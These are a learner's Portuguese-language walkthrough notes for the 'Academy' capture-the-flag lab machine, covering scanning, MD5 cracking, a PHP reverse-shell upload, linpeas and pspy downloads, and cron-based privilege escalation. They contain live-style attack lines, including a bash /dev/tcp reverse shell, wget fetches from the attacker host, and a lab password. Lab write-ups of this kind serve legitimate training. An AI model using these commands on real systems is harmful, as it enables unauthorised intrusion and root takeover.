@@ -1,0 +1,310 @@
+login: root
+passwd; tcm
+
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+
+Walkthrough - Academy
+    #dhclient
+    ip a
+    uname -a
+    ------------
+    (kali)
+    ftp 192.168.57.7
+    Name: anonymous passwd:tcm
+    ftp> ls
+    ftp> get note.txt
+    ---------
+    nmap -A -p- -T4 192.168.57.7
+        Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 09:57 EDT
+        Nmap scan report for 192.168.57.7
+        Host is up (0.00068s latency).
+        Not shown: 65532 closed tcp ports (reset)
+        PORT   STATE SERVICE VERSION
+        21/tcp open  ftp     vsftpd 3.0.3
+        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+        |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
+        | ftp-syst:
+        |   STAT:
+        | FTP server status:
+        |      Connected to ::ffff:192.168.57.5
+        |      Logged in as ftp
+        |      TYPE: ASCII
+        |      No session bandwidth limit
+        |      Session timeout in seconds is 300
+        |      Control connection is plain text
+        |      Data connections will be plain text
+        |      At session startup, client count was 4
+        |      vsFTPd 3.0.3 - secure, fast, stable
+        |_End of status
+        22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+        | ssh-hostkey:
+        |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
+        |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
+        |_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
+        80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+        |_http-title: Apache2 Debian Default Page: It works
+        |_http-server-header: Apache/2.4.38 (Debian)
+        MAC Address: 08:00:27:0E:1C:1D (Oracle VirtualBox virtual NIC)
+        Device type: general purpose
+        Running: Linux 4.X|5.X
+        OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+        OS details: Linux 4.15 - 5.6
+        Network Distance: 1 hop
+        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+        TRACEROUTE
+        HOP RTT     ADDRESS
+        1   0.68 ms 192.168.57.7
+
+        OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+        Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
+
+    ftp 192.168.57.7
+        Name: anonymous passwd:tcm
+        ftp> ls
+        ftp> get note.txt
+
+    cat note.txt
+        cd73502828457d15655bbd7a63fb0bc8
+    hash-identifier
+         HASH: cd73502828457d15655bbd7a63fb0bc8
+
+            Possible Hashs:
+            [+] MD5
+            [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+    pesquisar: hash crack md5 hash
+        https://www.4armed.com/blog/hashcat-crack-md5-hashes/
+
+        O comando para iniciar nosso ataque de dicionário nos hashes é:
+
+        hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt
+
+            -m 0 ->	Diz ao hashcat qual modo usar. 0 é MD5.
+            Hashes	-> Nosso arquivo contendo os nossos hashes de senha MD5.
+
+            /usr/share/wordlists/rockyou.txt ->	Aponta o hashcat para a lista de palavras que contém as senhas
+                                                     para hash e comparação.
+
+    locate rockyou.txt
+
+        /usr/share/wordlists/rockyou.txt.gz
+        gunzip rockyou.txt.gz
+
+    mousepad hashs.txt
+        cd73502828457d15655bbd7a63fb0bc8
+
+    hashcat -m 0 hashs.txt /usr/share/wordlists/rockyou.txt
+        cd73502828457d15655bbd7a63fb0bc8:student
+
+    dirb http://192.168.57.7
+        -----------------
+        DIRB v2.22
+        By The Dark Raver
+        -----------------
+
+        START_TIME: Thu Sep  1 10:52:27 2022
+        URL_BASE: http://192.168.57.7/
+        WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+        -----------------
+
+        GENERATED WORDS: 4612
+
+        ---- Scanning URL: http://192.168.57.7/ ----
+        + http://192.168.57.7/index.html (CODE:200|SIZE:10701)
+        ==> DIRECTORY: http://192.168.57.7/phpmyadmin/
+        + http://192.168.57.7/server-status (CODE:403|SIZE:277)
+        ...
+        ---- Entering directory: http://192.168.57.7/phpmyadmin/themes/original/jquery/images/ ----
+
+        -----------------
+        END_TIME: Thu Sep  1 10:53:39 2022
+        DOWNLOADED: 276720 - FOUND: 14
+
+    apt install ffuf
+        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.7/FUZZ
+
+            ________________________________________________
+
+             :: Method           : GET
+             :: URL              : http://192.168.57.7/FUZZ
+             :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+             :: Follow redirects : false
+             :: Calibration      : false
+             :: Timeout          : 10
+             :: Threads          : 40
+             :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+            ________________________________________________
+
+            ...
+            created by net/http.(*Transport).dialConn
+            net/http/transport.go:1750 +0x173e
+
+            goroutine 41960 [select]:
+            net/http.(*persistConn).writeLoop(0xc00103fb00)
+                    net/http/transport.go:2392 +0xf5
+            created by net/http.(*Transport).dialConn
+                    net/http/transport.go:1751 +0x1791
+
+    pesquisar: php reverse shell
+        https://github.com/pentestmonkey/php-reverse-shell
+            copiar: php-reverse-shell.php
+
+    nano shell.php (trocar ip e port)
+
+    nc -nvlp 1234
+
+        entrar no site do IP/academy e na foto fazer o upload do arquivo shell.php
+
+        connect to [192.168.57.5] from (UNKNOWN) [192.168.57.7] 60194
+        Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+         10:43:10 up 12 min,  0 users,  load average: 0.00, 0.00, 0.00
+        USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+        /bin/sh: 0: can't access tty; job control turned off
+        $ whoami
+        www-data
+        $ sudo -l
+        /bin/sh: 2: sudo: not found
+        $ locate sudo
+        /bin/sh: 3: locate: not found
+        $
+
+
+    (entrou no sistema como usuário comum)
+        whoami
+        sudo -l
+        locate sudo
+        cd /tmp
+        --------------------------------
+        no kali
+
+        pesquisar: linpeas
+            LinPEAS é um script que procura possíveis caminhos para escalar privilégios em hosts Linux/Unix*/MacOS.
+             As verificações são explicadas em book.hacktricks.xyz
+
+        https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+        copiar: linpeas_base.sh
+
+        python3 -m http.server 80
+        -------------------------------------------------
+
+        wget http://192.168.57.5/linpeas.sh
+        chmod +x linpeas.sh
+        ./linpeas.sh
+            Starting linpeas. Caching Writable Folders...
+
+            ./linpeas.sh: 465: ./linpeas.sh: peass{VARIABLES}: not found
+                                           ╔═══════════════════╗
+            ═══════════════════════════════╣ Basic information ╠═══════════════════════════════
+                                           ╚═══════════════════╝
+            OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)
+            User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            Hostname: academy
+            Writable folder: /dev/shm
+            [+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+            [+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
+            [+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+            ...
+
+    (com as informações obtidas de senha do administrador)
+    ssh grimmie@192.168.57.7
+    passwd: My_V3ryS3cur3_P4ss
+
+        grimmie@192.168.57.7's password:
+        Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+        The programs included with the Debian GNU/Linux system are free software;
+        the exact distribution terms for each program are described in the
+        individual files in /usr/share/doc/*/copyright.
+
+        Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+        permitted by applicable law.
+        Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
+        grimmie@academy:~$ pwd
+        /home/grimmie
+        grimmie@academy:~$
+
+
+    cd /home/grimmie/
+    ls
+    cat backup.sh
+        #!/bin/bash
+
+        rm /tmp/backup.zip
+        zip -r /tmp/backup.zip /var/www/html/academy/includes
+        chmod 700 /tmp/backup.zip
+
+    crontab -l
+    crontab -u root -l
+    crontab -e
+    systemctl list-timers
+        NEXT                         LEFT       LAST                         PASSED    UNIT                         AC
+        Fri 2022-09-02 11:39:00 EDT  24min left Fri 2022-09-02 11:09:01 EDT  5min ago  phpsessionclean.timer        ph
+        Sat 2022-09-03 00:00:00 EDT  12h left   Fri 2022-09-02 10:30:55 EDT  44min ago logrotate.timer              lo
+        Sat 2022-09-03 00:00:00 EDT  12h left   Fri 2022-09-02 10:30:55 EDT  44min ago man-db.timer                 ma
+        Sat 2022-09-03 01:42:41 EDT  14h left   Fri 2022-09-02 10:30:55 EDT  44min ago apt-daily.timer              ap
+        Sat 2022-09-03 06:36:35 EDT  19h left   Fri 2022-09-02 10:30:55 EDT  44min ago apt-daily-upgrade.timer      ap
+        Sat 2022-09-03 10:46:01 EDT  23h left   Fri 2022-09-02 10:46:01 EDT  28min ago systemd-tmpfiles-clean.timer sy
+
+        6 timers listed.
+        Pass --all to see loaded but inactive timers, too.
+    ps
+
+    pesquisar: pspy
+        pspy é uma ferramenta de linha de comando projetada para bisbilhotar processos sem necessidade de
+        permissões de root. Ele permite que você veja comandos executados por outros usuários, cron jobs, etc.
+    https://github.com/DominicBreuker/pspy
+        pspy64 download
+
+    cd /tpm
+    wget http://192.168.57.5/pspy64
+    chmod +x pspy
+    ./pspy64
+    ...
+        2022/09/02 11:22:54 CMD: UID=0    PID=1860   |
+        2022/09/02 11:23:01 CMD: UID=0    PID=1861   | /usr/sbin/CRON -f
+        2022/09/02 11:23:01 CMD: UID=0    PID=1862   | /usr/sbin/CRON -f
+        2022/09/02 11:23:01 CMD: UID=0    PID=1863   | /bin/sh -c /home/grimmie/backup.sh
+        2022/09/02 11:23:01 CMD: UID=0    PID=1864   | /bin/bash /home/grimmie/backup.sh
+        2022/09/02 11:23:01 CMD: UID=0    PID=1865   | /bin/bash /home/grimmie/backup.sh
+        2022/09/02 11:23:01 CMD: UID=0    PID=1866   | /bin/bash /home/grimmie/backup.sh
+    ...
+
+    pesquisar: bash reverse shell one liner
+        https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+        grimmie@academy:~$ nano backup.sh
+        (apagar o conteúdo do script backup.sh e adicionar a seginte linha:)
+
+        bash -i >& /dev/tcp/192.168.57.5/8081 0>&1
+        Algumas versões do bash podem enviar um shell reverso (isso foi testado no Ubuntu 10.10):
+
+    no kali
+    nc -nvlp 8081
+
+     ./backup.sh
+
+        root@academy:~# cd /root
+        cd /root
+        root@academy:~# ls
+        ls
+        flag.txt
+        root@academy:~# cat flag.txt
+        cat flag.txt
+        Congratz you rooted this box !
+        Looks like this CMS isn't so secure...
+        I hope you enjoyed it.
+        If you had any issue please let us know in the course discord.
+
+        Happy hacking !
+        root@academy:~#
+
+
+
+
+
+
+
+
